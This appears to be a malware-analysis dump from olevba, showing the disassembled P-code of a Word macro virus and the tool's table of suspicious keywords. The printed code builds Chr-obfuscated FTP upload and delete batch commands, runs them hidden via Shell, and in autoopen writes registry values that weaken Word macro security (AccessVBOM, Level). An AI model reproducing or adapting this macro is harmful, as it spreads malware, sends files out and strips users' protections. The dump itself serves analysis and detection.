' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "drom"
' 	Add 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ut "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #129:
' Line #130:
' 	Ld sn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "f"
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 " -n -s:"
' 	Add 
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "el "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "del"
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "del"
' 	Ld sn 
' 	Add 
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #136:
' 	Ld sn 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #137:
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub ToolsOptions())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #143:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #144:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #145:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #146:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub ViewVBCode())
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub autoopen())
' Line #151:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #152:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0017 "DontTrustInstalledFiles"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #153:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

